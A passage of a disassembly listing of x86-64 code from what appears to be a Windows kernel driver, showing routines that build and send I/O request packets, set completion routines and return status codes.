   1400065b3:	44 8b ca             	mov    %edx,%r9d
   1400065b6:	48 8b cf             	mov    %rdi,%rcx
   1400065b9:	e8 b4 0a 00 00       	call   0x140007072
   1400065be:	48 85 f6             	test   %rsi,%rsi
   1400065c1:	74 4b                	je     0x14000660e
   1400065c3:	4c 8b f6             	mov    %rsi,%r14
   1400065c6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400065cb:	48 ff c6             	inc    %rsi
   1400065ce:	2b de                	sub    %esi,%ebx
   1400065d0:	48 8b d6             	mov    %rsi,%rdx
   1400065d3:	48 63 db             	movslq %ebx,%rbx
   1400065d6:	4c 8b c3             	mov    %rbx,%r8
   1400065d9:	e8 e2 0b 00 00       	call   0x1400071c0
   1400065de:	48 83 fb 14          	cmp    $0x14,%rbx
   1400065e2:	0f 83 a3 00 00 00    	jae    0x14000668b
   1400065e8:	48 8d 8f 00 02 00 00 	lea    0x200(%rdi),%rcx
   1400065ef:	c6 44 1c 20 00       	movb   $0x0,0x20(%rsp,%rbx,1)
   1400065f4:	4c 8b c3             	mov    %rbx,%r8
   1400065f7:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400065fc:	e8 bf 0b 00 00       	call   0x1400071c0
   140006601:	c6 84 3b 00 02 00 00 	movb   $0x0,0x200(%rbx,%rdi,1)
   140006608:	00 
   140006609:	49 8b de             	mov    %r14,%rbx
   14000660c:	eb 19                	jmp    0x140006627
   14000660e:	48 8d 8f 00 02 00 00 	lea    0x200(%rdi),%rcx
   140006615:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000661b:	48 8d 15 ee 10 00 00 	lea    0x10ee(%rip),%rdx        # 0x140007710
   140006622:	e8 99 0b 00 00       	call   0x1400071c0
   140006627:	2b dd                	sub    %ebp,%ebx
   140006629:	48 8d 8f 10 02 00 00 	lea    0x210(%rdi),%rcx
   140006630:	41 be 00 02 00 00    	mov    $0x200,%r14d
   140006636:	48 8b d5             	mov    %rbp,%rdx
   140006639:	41 3b de             	cmp    %r14d,%ebx
   14000663c:	41 0f 4f de          	cmovg  %r14d,%ebx
   140006640:	48 63 f3             	movslq %ebx,%rsi
   140006643:	4c 8b c6             	mov    %rsi,%r8
   140006646:	e8 75 0b 00 00       	call   0x1400071c0
   14000664b:	41 3b de             	cmp    %r14d,%ebx
   14000664e:	7d 0a                	jge    0x14000665a
   140006650:	c6 84 3e 10 02 00 00 	movb   $0x0,0x210(%rsi,%rdi,1)
   140006657:	00 
   140006658:	eb 07                	jmp    0x140006661
   14000665a:	c6 87 0f 04 00 00 00 	movb   $0x0,0x40f(%rdi)
   140006661:	b0 01                	mov    $0x1,%al
   140006663:	48 8b 8c 24 40 04 00 	mov    0x440(%rsp),%rcx
   14000666a:	00 
   14000666b:	48 33 cc             	xor    %rsp,%rcx
   14000666e:	e8 3d 0a 00 00       	call   0x1400070b0
   140006673:	4c 8d 9c 24 50 04 00 	lea    0x450(%rsp),%r11
   14000667a:	00 
   14000667b:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000667f:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140006683:	49 8b e3             	mov    %r11,%rsp
   140006686:	41 5e                	pop    %r14
   140006688:	5f                   	pop    %rdi
   140006689:	5e                   	pop    %rsi
   14000668a:	c3                   	ret
   14000668b:	e8 70 0a 00 00       	call   0x140007100
   140006690:	cc                   	int3
   140006691:	cc                   	int3
   140006692:	cc                   	int3
   140006693:	cc                   	int3
   140006694:	40 53                	rex push %rbx
   140006696:	48 83 ec 20          	sub    $0x20,%rsp
   14000669a:	45 33 c0             	xor    %r8d,%r8d
   14000669d:	48 8b d9             	mov    %rcx,%rbx
   1400066a0:	41 8d 50 01          	lea    0x1(%r8),%edx
   1400066a4:	ff 15 76 1c 00 00    	call   *0x1c76(%rip)        # 0x140008320
   1400066aa:	33 d2                	xor    %edx,%edx
   1400066ac:	b1 01                	mov    $0x1,%cl
   1400066ae:	ff 15 1c 1b 00 00    	call   *0x1b1c(%rip)        # 0x1400081d0
   1400066b4:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400066b8:	48 85 c0             	test   %rax,%rax
   1400066bb:	75 07                	jne    0x1400066c4
   1400066bd:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   1400066c2:	eb 1c                	jmp    0x1400066e0
   1400066c4:	48 8b 80 b8 00 00 00 	mov    0xb8(%rax),%rax
   1400066cb:	48 8d 0d 1e 00 00 00 	lea    0x1e(%rip),%rcx        # 0x1400066f0
   1400066d2:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
   1400066d6:	48 89 58 f8          	mov    %rbx,-0x8(%rax)
   1400066da:	c6 40 bb e0          	movb   $0xe0,-0x45(%rax)
   1400066de:	33 c0                	xor    %eax,%eax
   1400066e0:	48 83 c4 20          	add    $0x20,%rsp
   1400066e4:	5b                   	pop    %rbx
   1400066e5:	c3                   	ret
   1400066e6:	cc                   	int3
   1400066e7:	cc                   	int3
   1400066e8:	cc                   	int3
   1400066e9:	cc                   	int3
   1400066ea:	cc                   	int3
   1400066eb:	cc                   	int3
   1400066ec:	cc                   	int3
   1400066ed:	cc                   	int3
   1400066ee:	cc                   	int3
   1400066ef:	cc                   	int3
   1400066f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400066f4:	49 8b c8             	mov    %r8,%rcx
   1400066f7:	33 d2                	xor    %edx,%edx
   1400066f9:	45 33 c0             	xor    %r8d,%r8d
   1400066fc:	ff 15 16 1c 00 00    	call   *0x1c16(%rip)        # 0x140008318
   140006702:	b8 16 00 00 c0       	mov    $0xc0000016,%eax
   140006707:	48 83 c4 28          	add    $0x28,%rsp
   14000670b:	c3                   	ret
   14000670c:	40 53                	rex push %rbx
   14000670e:	48 83 ec 20          	sub    $0x20,%rsp
   140006712:	48 8b d9             	mov    %rcx,%rbx
   140006715:	ff 15 f5 1a 00 00    	call   *0x1af5(%rip)        # 0x140008210
   14000671b:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   14000671f:	ba 01 00 00 c0       	mov    $0xc0000001,%edx
   140006724:	ff 15 c6 1b 00 00    	call   *0x1bc6(%rip)        # 0x1400082f0
   14000672a:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000672e:	48 8b 90 b8 00 00 00 	mov    0xb8(%rax),%rdx
   140006735:	48 8d 05 b4 ff ff ff 	lea    -0x4c(%rip),%rax        # 0x1400066f0
   14000673c:	48 89 42 f0          	mov    %rax,-0x10(%rdx)
   140006740:	48 89 5a f8          	mov    %rbx,-0x8(%rdx)
   140006744:	c6 42 bb e0          	movb   $0xe0,-0x45(%rdx)
   140006748:	48 83 c4 20          	add    $0x20,%rsp
   14000674c:	5b                   	pop    %rbx
   14000674d:	c3                   	ret
   14000674e:	cc                   	int3
   14000674f:	cc                   	int3
   140006750:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006755:	57                   	push   %rdi
   140006756:	48 83 ec 30          	sub    $0x30,%rsp
   14000675a:	8b 02                	mov    (%rdx),%eax
   14000675c:	48 8b da             	mov    %rdx,%rbx
   14000675f:	48 8b f9             	mov    %rcx,%rdi
   140006762:	3d 03 01 00 00       	cmp    $0x103,%eax
   140006767:	75 1d                	jne    0x140006786
   140006769:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000676f:	45 33 c9             	xor    %r9d,%r9d
   140006772:	45 33 c0             	xor    %r8d,%r8d
   140006775:	33 d2                	xor    %edx,%edx
   140006777:	ff 15 93 1b 00 00    	call   *0x1b93(%rip)        # 0x140008310
   14000677d:	48 8b 47 18          	mov    0x18(%rdi),%rax
   140006781:	8b 40 30             	mov    0x30(%rax),%eax
   140006784:	89 03                	mov    %eax,(%rbx)
   140006786:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000678b:	48 83 c4 30          	add    $0x30,%rsp
   14000678f:	5f                   	pop    %rdi
   140006790:	c3                   	ret
   140006791:	cc                   	int3
   140006792:	cc                   	int3
   140006793:	cc                   	int3
   140006794:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006799:	57                   	push   %rdi
   14000679a:	48 83 ec 20          	sub    $0x20,%rsp
   14000679e:	48 8b f9             	mov    %rcx,%rdi
   1400067a1:	48 85 c9             	test   %rcx,%rcx
   1400067a4:	74 58                	je     0x1400067fe
   1400067a6:	ff 15 cc 19 00 00    	call   *0x19cc(%rip)        # 0x140008178
   1400067ac:	84 c0                	test   %al,%al
   1400067ae:	74 4e                	je     0x1400067fe
   1400067b0:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   1400067b4:	e8 53 ff ff ff       	call   0x14000670c
   1400067b9:	48 8b 47 08          	mov    0x8(%rdi),%rax
   1400067bd:	48 8b 57 28          	mov    0x28(%rdi),%rdx
   1400067c1:	48 8b 0f             	mov    (%rdi),%rcx
   1400067c4:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400067c8:	ff 15 a2 1b 00 00    	call   *0x1ba2(%rip)        # 0x140008370
   1400067ce:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400067d3:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400067d7:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   1400067db:	e8 70 ff ff ff       	call   0x140006750
   1400067e0:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   1400067e4:	ff 15 fe 18 00 00    	call   *0x18fe(%rip)        # 0x1400080e8
   1400067ea:	ba 7a 63 64 76       	mov    $0x7664637a,%edx
   1400067ef:	48 8b cf             	mov    %rdi,%rcx
   1400067f2:	ff 15 48 1b 00 00    	call   *0x1b48(%rip)        # 0x140008340
   1400067f8:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1400067fc:	eb 05                	jmp    0x140006803
   1400067fe:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140006803:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006808:	48 83 c4 20          	add    $0x20,%rsp
   14000680c:	5f                   	pop    %rdi
   14000680d:	c3                   	ret
   14000680e:	cc                   	int3
   14000680f:	cc                   	int3
   140006810:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140006815:	55                   	push   %rbp
   140006816:	56                   	push   %rsi
   140006817:	57                   	push   %rdi
   140006818:	48 83 ec 50          	sub    $0x50,%rsp
   14000681c:	48 8b 05 8d 4f 00 00 	mov    0x4f8d(%rip),%rax        # 0x14000b7b0
   140006823:	48 33 c4             	xor    %rsp,%rax
   140006826:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000682b:	48 8b f2             	mov    %rdx,%rsi
   14000682e:	48 8b d9             	mov    %rcx,%rbx
   140006831:	48 85 c9             	test   %rcx,%rcx
   140006834:	0f 84 93 00 00 00    	je     0x1400068cd
   14000683a:	ff 15 38 19 00 00    	call   *0x1938(%rip)        # 0x140008178
   140006840:	84 c0                	test   %al,%al
   140006842:	0f 84 85 00 00 00    	je     0x1400068cd
   140006848:	48 8d 7b 10          	lea    0x10(%rbx),%rdi
   14000684c:	48 8b cf             	mov    %rdi,%rcx
   14000684f:	e8 b8 fe ff ff       	call   0x14000670c
   140006854:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006858:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   14000685d:	4c 8b 4b 28          	mov    0x28(%rbx),%r9
   140006861:	45 33 c0             	xor    %r8d,%r8d
   140006864:	48 8b 0b             	mov    (%rbx),%rcx
   140006867:	48 c7 44 24 38 02 00 	movq   $0x2,0x38(%rsp)
   14000686e:	00 00 
   140006870:	48 8b 40 10          	mov    0x10(%rax),%rax
   140006874:	ff 15 f6 1a 00 00    	call   *0x1af6(%rip)        # 0x140008370
   14000687a:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000687f:	48 8b cf             	mov    %rdi,%rcx
   140006882:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140006886:	e8 c5 fe ff ff       	call   0x140006750
   14000688b:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000688f:	85 c0                	test   %eax,%eax
   140006891:	78 3f                	js     0x1400068d2
   140006893:	48 8b cf             	mov    %rdi,%rcx
   140006896:	e8 71 fe ff ff       	call   0x14000670c
   14000689b:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000689f:	45 33 c0             	xor    %r8d,%r8d
   1400068a2:	4c 8b 4b 28          	mov    0x28(%rbx),%r9
   1400068a6:	48 8b d6             	mov    %rsi,%rdx
   1400068a9:	48 8b 0b             	mov    (%rbx),%rcx
   1400068ac:	48 8b 40 18          	mov    0x18(%rax),%rax
   1400068b0:	ff 15 ba 1a 00 00    	call   *0x1aba(%rip)        # 0x140008370
   1400068b6:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400068bb:	48 8b cf             	mov    %rdi,%rcx
   1400068be:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400068c2:	e8 89 fe ff ff       	call   0x140006750
   1400068c7:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1400068cb:	eb 05                	jmp    0x1400068d2
   1400068cd:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1400068d2:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400068d7:	48 33 cc             	xor    %rsp,%rcx
   1400068da:	e8 d1 07 00 00       	call   0x1400070b0
   1400068df:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400068e6:	00 
   1400068e7:	48 83 c4 50          	add    $0x50,%rsp
   1400068eb:	5f                   	pop    %rdi
   1400068ec:	5e                   	pop    %rsi
   1400068ed:	5d                   	pop    %rbp
   1400068ee:	c3                   	ret
   1400068ef:	cc                   	int3
   1400068f0:	48 83 ec 38          	sub    $0x38,%rsp
   1400068f4:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   1400068fb:	00 
   1400068fc:	e8 07 00 00 00       	call   0x140006908
   140006901:	48 83 c4 38          	add    $0x38,%rsp
   140006905:	c3                   	ret
   140006906:	cc                   	int3
   140006907:	cc                   	int3
   140006908:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000690d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006912:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006917:	57                   	push   %rdi
   140006918:	41 56                	push   %r14
   14000691a:	41 57                	push   %r15
   14000691c:	48 83 ec 70          	sub    $0x70,%rsp
   140006920:	44 0f b7 fa          	movzwl %dx,%r15d
   140006924:	45 0f b7 f0          	movzwl %r8w,%r14d
   140006928:	ba 30 00 00 00       	mov    $0x30,%edx
   14000692d:	48 8b f1             	mov    %rcx,%rsi
   140006930:	41 b8 7a 63 64 76    	mov    $0x7664637a,%r8d
   140006936:	41 8b e9             	mov    %r9d,%ebp
   140006939:	8d 4a d1             	lea    -0x2f(%rdx),%ecx
   14000693c:	ff 15 c6 19 00 00    	call   *0x19c6(%rip)        # 0x140008308
   140006942:	48 8b d8             	mov    %rax,%rbx
   140006945:	48 85 c0             	test   %rax,%rax
   140006948:	0f 84 a8 00 00 00    	je     0x1400069f6
   14000694e:	48 8b c8             	mov    %rax,%rcx
   140006951:	ff 15 21 18 00 00    	call   *0x1821(%rip)        # 0x140008178
   140006957:	84 c0                	test   %al,%al
   140006959:	0f 84 97 00 00 00    	je     0x1400069f6
   14000695f:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   140006963:	e8 2c fd ff ff       	call   0x140006694
   140006968:	85 c0                	test   %eax,%eax
   14000696a:	0f 88 8b 00 00 00    	js     0x1400069fb
   140006970:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140006974:	44 8b cd             	mov    %ebp,%r9d
   140006977:	8b 94 24 b0 00 00 00 	mov    0xb0(%rsp),%edx
   14000697e:	45 0f b7 c6          	movzwl %r14w,%r8d
   140006982:	48 8b 05 df d2 00 00 	mov    0xd2df(%rip),%rax        # 0x140013c68
   140006989:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   14000698e:	48 83 64 24 48 00    	andq   $0x0,0x48(%rsp)
   140006994:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000699a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400069a0:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400069a6:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   1400069ac:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400069b0:	48 8b 0d a9 d2 00 00 	mov    0xd2a9(%rip),%rcx        # 0x140013c60
   1400069b7:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1400069bb:	41 0f b7 d7          	movzwl %r15w,%edx
   1400069bf:	ff 15 ab 19 00 00    	call   *0x19ab(%rip)        # 0x140008370
   1400069c5:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400069ca:	89 44 24 60          	mov    %eax,0x60(%rsp)
   1400069ce:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   1400069d2:	e8 79 fd ff ff       	call   0x140006750
   1400069d7:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1400069db:	85 c0                	test   %eax,%eax
   1400069dd:	78 1c                	js     0x1400069fb
   1400069df:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1400069e3:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   1400069e7:	48 89 0b             	mov    %rcx,(%rbx)
   1400069ea:	48 8b 09             	mov    (%rcx),%rcx
   1400069ed:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   1400069f1:	48 89 1e             	mov    %rbx,(%rsi)
   1400069f4:	eb 05                	jmp    0x1400069fb
   1400069f6:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   1400069fb:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140006a00:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140006a04:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   140006a08:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140006a0c:	49 8b e3             	mov    %r11,%rsp
   140006a0f:	41 5f                	pop    %r15
   140006a11:	41 5e                	pop    %r14
   140006a13:	5f                   	pop    %rdi
   140006a14:	c3                   	ret
   140006a15:	cc                   	int3
   140006a16:	cc                   	int3
   140006a17:	cc                   	int3
   140006a18:	48 83 ec 28          	sub    $0x28,%rsp
   140006a1c:	48 8d 0d 25 d2 00 00 	lea    0xd225(%rip),%rcx        # 0x140013c48
   140006a23:	e8 64 06 00 00       	call   0x14000708c
   140006a28:	48 8d 0d 19 d2 00 00 	lea    0xd219(%rip),%rcx        # 0x140013c48
   140006a2f:	48 83 c4 28          	add    $0x28,%rsp
   140006a33:	e9 5a 06 00 00       	jmp    0x140007092
   140006a38:	48 8b 05 29 d2 00 00 	mov    0xd229(%rip),%rax        # 0x140013c68
   140006a3f:	48 8b d1             	mov    %rcx,%rdx
   140006a42:	48 8b 0d 17 d2 00 00 	mov    0xd217(%rip),%rcx        # 0x140013c60
   140006a49:	48 8b 40 28          	mov    0x28(%rax),%rax
   140006a4d:	48 ff 25 1c 19 00 00 	rex.W jmp *0x191c(%rip)        # 0x140008370
   140006a54:	48 8b c4             	mov    %rsp,%rax
   140006a57:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140006a5b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140006a5f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006a63:	57                   	push   %rdi
   140006a64:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140006a6b:	48 8b e9             	mov    %rcx,%rbp
   140006a6e:	49 8b d9             	mov    %r9,%rbx
   140006a71:	48 8d 48 d0          	lea    -0x30(%rax),%rcx
   140006a75:	49 8b f8             	mov    %r8,%rdi
   140006a78:	48 8b f2             	mov    %rdx,%rsi
   140006a7b:	e8 14 fc ff ff       	call   0x140006694
   140006a80:	33 d2                	xor    %edx,%edx
   140006a82:	85 c0                	test   %eax,%eax
   140006a84:	78 6c                	js     0x140006af2
   140006a86:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140006a8d:	00 
   140006a8e:	45 33 c9             	xor    %r9d,%r9d
   140006a91:	48 8b 05 d0 d1 00 00 	mov    0xd1d0(%rip),%rax        # 0x140013c68
   140006a98:	4c 8b c6             	mov    %rsi,%r8
   140006a9b:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   140006aa0:	48 8b 0d b9 d1 00 00 	mov    0xd1b9(%rip),%rcx        # 0x140013c60
   140006aa7:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   140006aac:	48 8b 40 20          	mov    0x20(%rax),%rax
   140006ab0:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140006ab5:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140006aba:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140006abf:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140006ac4:	48 8b d5             	mov    %rbp,%rdx
   140006ac7:	ff 15 a3 18 00 00    	call   *0x18a3(%rip)        # 0x140008370
   140006acd:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140006ad2:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140006ad6:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140006adb:	e8 70 fc ff ff       	call   0x140006750
   140006ae0:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140006ae7:	00 
   140006ae8:	ff 15 fa 15 00 00    	call   *0x15fa(%rip)        # 0x1400080e8
   140006aee:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140006af2:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140006af9:	00 
   140006afa:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140006afe:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140006b02:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140006b06:	49 8b e3             	mov    %r11,%rsp
   140006b09:	5f                   	pop    %rdi
   140006b0a:	c3                   	ret
   140006b0b:	cc                   	int3
   140006b0c:	48 83 ec 38          	sub    $0x38,%rsp
   140006b10:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006b16:	48 8d 05 83 4c 00 00 	lea    0x4c83(%rip),%rax        # 0x14000b7a0
   140006b1d:	48 8d 15 24 d1 00 00 	lea    0xd124(%rip),%rdx        # 0x140013c48
   140006b24:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140006b29:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006b2e:	e8 4d 05 00 00       	call   0x140007080
   140006b33:	85 c0                	test   %eax,%eax
   140006b35:	78 16                	js     0x140006b4d
   140006b37:	4c 8d 05 22 d1 00 00 	lea    0xd122(%rip),%r8        # 0x140013c60
   140006b3e:	83 ca ff             	or     $0xffffffff,%edx
   140006b41:	48 8d 0d 00 d1 00 00 	lea    0xd100(%rip),%rcx        # 0x140013c48
   140006b48:	e8 39 05 00 00       	call   0x140007086
   140006b4d:	48 83 c4 38          	add    $0x38,%rsp
   140006b51:	c3                   	ret
   140006b52:	cc                   	int3
   140006b53:	cc                   	int3
   140006b54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006b59:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006b5e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006b63:	57                   	push   %rdi
   140006b64:	48 83 ec 30          	sub    $0x30,%rsp
   140006b68:	41 8b f9             	mov    %r9d,%edi
   140006b6b:	49 8b f0             	mov    %r8,%rsi
   140006b6e:	48 8b ea             	mov    %rdx,%rbp
   140006b71:	48 8b d9             	mov    %rcx,%rbx
   140006b74:	48 85 c9             	test   %rcx,%rcx
   140006b77:	74 22                	je     0x140006b9b
   140006b79:	ff 15 f9 15 00 00    	call   *0x15f9(%rip)        # 0x140008178
   140006b7f:	84 c0                	test   %al,%al
   140006b81:	74 18                	je     0x140006b9b
   140006b83:	44 8b cf             	mov    %edi,%r9d
   140006b86:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   140006b8b:	4c 8b c6             	mov    %rsi,%r8
   140006b8e:	48 8b d5             	mov    %rbp,%rdx
   140006b91:	48 8b cb             	mov    %rbx,%rcx
   140006b94:	e8 33 00 00 00       	call   0x140006bcc
   140006b99:	eb 05                	jmp    0x140006ba0
   140006b9b:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140006ba0:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006ba5:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140006baa:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140006baf:	48 83 c4 30          	add    $0x30,%rsp
   140006bb3:	5f                   	pop    %rdi
   140006bb4:	c3                   	ret
   140006bb5:	cc                   	int3
   140006bb6:	cc                   	int3
   140006bb7:	cc                   	int3
   140006bb8:	48 83 ec 38          	sub    $0x38,%rsp
   140006bbc:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   140006bc1:	e8 06 00 00 00       	call   0x140006bcc
   140006bc6:	48 83 c4 38          	add    $0x38,%rsp
   140006bca:	c3                   	ret
   140006bcb:	cc                   	int3
   140006bcc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006bd1:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006bd6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140006bdb:	41 56                	push   %r14
   140006bdd:	48 83 ec 50          	sub    $0x50,%rsp
   140006be1:	45 8b f1             	mov    %r9d,%r14d
   140006be4:	49 8b f0             	mov    %r8,%rsi
   140006be7:	48 8b fa             	mov    %rdx,%rdi
   140006bea:	48 8b d9             	mov    %rcx,%rbx
   140006bed:	48 85 c9             	test   %rcx,%rcx
   140006bf0:	0f 84 c0 00 00 00    	je     0x140006cb6
   140006bf6:	ff 15 7c 15 00 00    	call   *0x157c(%rip)        # 0x140008178
   140006bfc:	84 c0                	test   %al,%al
   140006bfe:	0f 84 b2 00 00 00    	je     0x140006cb6
   140006c04:	83 64 24 38 00       	andl   $0x0,0x38(%rsp)
   140006c09:	8b 06                	mov    (%rsi),%eax
   140006c0b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140006c10:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140006c16:	45 33 c9             	xor    %r9d,%r9d
   140006c19:	45 33 c0             	xor    %r8d,%r8d
   140006c1c:	8b d0                	mov    %eax,%edx
   140006c1e:	48 8b cf             	mov    %rdi,%rcx
   140006c21:	ff 15 b9 16 00 00    	call   *0x16b9(%rip)        # 0x1400082e0
   140006c27:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006c2c:	33 d2                	xor    %edx,%edx
   140006c2e:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140006c32:	48 8b c8             	mov    %rax,%rcx
   140006c35:	ff 15 95 16 00 00    	call   *0x1695(%rip)        # 0x1400082d0
   140006c3b:	90                   	nop
   140006c3c:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   140006c40:	e8 c7 fa ff ff       	call   0x14000670c
   140006c45:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006c49:	4c 8b 4b 28          	mov    0x28(%rbx),%r9
   140006c4d:	48 8b 0b             	mov    (%rbx),%rcx
   140006c50:	45 8b c6             	mov    %r14d,%r8d
   140006c53:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140006c58:	80 bc 24 80 00 00 00 	cmpb   $0x0,0x80(%rsp)
   140006c5f:	00 
   140006c60:	74 06                	je     0x140006c68
   140006c62:	48 8b 40 30          	mov    0x30(%rax),%rax
   140006c66:	eb 04                	jmp    0x140006c6c
   140006c68:	48 8b 40 38          	mov    0x38(%rax),%rax
   140006c6c:	ff 15 fe 16 00 00    	call   *0x16fe(%rip)        # 0x140008370
   140006c72:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140006c76:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140006c7b:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   140006c7f:	e8 cc fa ff ff       	call   0x140006750
   140006c84:	8b 7c 24 60          	mov    0x60(%rsp),%edi
   140006c88:	85 ff                	test   %edi,%edi
   140006c8a:	78 09                	js     0x140006c95
   140006c8c:	48 8b 43 28          	mov    0x28(%rbx),%rax
   140006c90:	8b 48 38             	mov    0x38(%rax),%ecx
   140006c93:	89 0e                	mov    %ecx,(%rsi)
   140006c95:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006c9a:	ff 15 38 16 00 00    	call   *0x1638(%rip)        # 0x1400082d8
   140006ca0:	eb 05                	jmp    0x140006ca7
   140006ca2:	bf 05 00 00 c0       	mov    $0xc0000005,%edi
   140006ca7:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140006cac:	ff 15 36 16 00 00    	call   *0x1636(%rip)        # 0x1400082e8
   140006cb2:	8b c7                	mov    %edi,%eax
   140006cb4:	eb 05                	jmp    0x140006cbb
   140006cb6:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140006cbb:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140006cc0:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140006cc5:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140006cca:	48 83 c4 50          	add    $0x50,%rsp
   140006cce:	41 5e                	pop    %r14
   140006cd0:	c3                   	ret
   140006cd1:	cc                   	int3
   140006cd2:	cc                   	int3
   140006cd3:	cc                   	int3
   140006cd4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006cd9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140006cde:	56                   	push   %rsi
   140006cdf:	57                   	push   %rdi
